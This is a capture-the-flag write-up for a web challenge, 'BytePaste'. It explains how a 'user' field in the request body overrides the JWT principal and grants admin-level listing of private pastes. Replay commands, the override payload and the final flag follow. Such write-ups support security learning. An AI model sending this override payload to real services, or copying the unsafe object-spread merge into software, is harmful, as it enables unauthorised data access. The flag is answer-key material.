# BytePaste

## Metadata

- Event: ByteCTF challenge 143
- Category: Web
- Pattern: request-body principal override after valid JWT
- Knowledge link:
  [ctf-knowledge-web.md#request-body-principal-override-after-authentication](ctf-knowledge-web.md#request-body-principal-override-after-authentication)
- Local solution:
  [solution note](../../../ctf/bytectf-143/challenges/bytepaste/notes/solution.md)

## Prompt Summary

BytePaste is a paste-sharing application with source code attached. The goal is
to recover a hidden private paste containing the flag.

## Signals

- Source code is available and should be treated as primary evidence.
- Hono registers an unauthenticated `GET /pastes/:slug` before JWT middleware.
- The JWT middleware protects `/pastes/*`, including list and create routes.
- Registration returns success and login can return a valid JWT with
  `role: null`.
- `PasteService.list(user, data)` builds `query = { ...defaultQuery, ...data }`
  and then calls `repository.list({ user, ...query })`, allowing a body field
  named `user` to override the trusted JWT principal.
- `repository.list` grants full visibility when `query.user.role === 'admin'`.

## Route

1. Use `ctf_artifact.py zip-inspect --extract` to inspect the source.
2. Read frontend chunks to map browser actions to `/api/*` routes.
3. Register and log in to get a valid JWT.
4. Call `POST /api/pastes` with `Authorization: Bearer <valid token>` and body
   `{"user":{"email":"attacker","role":"admin"},"fuzzy":"flag",...}`.
5. The response leaks candidate slugs.
6. Read candidate slugs through public `GET /api/pastes/<slug>`.

## Replay Commands

```bash
python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/bytepaste \
  --url /api/register \
  --method POST \
  --header 'Content-Type: application/json' \
  --data '{"email":"admin","password":"x"}' \
  --label register_admin_plain

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/bytepaste \
  --url /api/login \
  --method POST \
  --header 'Content-Type: application/json' \
  --data '{"email":"admin","password":"x"}' \
  --label login_admin_plain_after_register

TOKEN=$(grep -o 'eyJ[^"}]*' \
  ctf/bytectf-143/challenges/bytepaste/responses/login_admin_plain_after_register.http \
  | tail -n1)

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/bytepaste \
  --url /api/pastes \
  --method POST \
  --header 'Content-Type: application/json' \
  --header "Authorization: Bearer $TOKEN" \
  --data '{"user":{"email":"attacker","role":"admin"},"fuzzy":"flag","limit":100,"offset":0}' \
  --label pastes_valid_jwt_body_admin_override_fuzzy_flag

python scripts/sec.py probe web param-probe \
  --case-dir ctf/bytectf-143/challenges/bytepaste \
  --url-template '/api/pastes/{payload}' \
  --payload QxNHxAEj \
  --payload FWOUejj7 \
  --label paste_public_read_fuzzy_flag_hits \
  --stop-on-flag
```

## False Leads

- Trying to forge the random JWT secret.
- Assuming a JWT with `role: null` is useless.
- Reading random slugs before using the source-backed search parameter to
  narrow candidates.
- Treating the unauthenticated slug read as enough without first leaking valid
  slugs.

## Final

`flag{e7cdbc48fc1fb2d5f8625b57b678b87d1c7fd5f54607347358ee9727}`
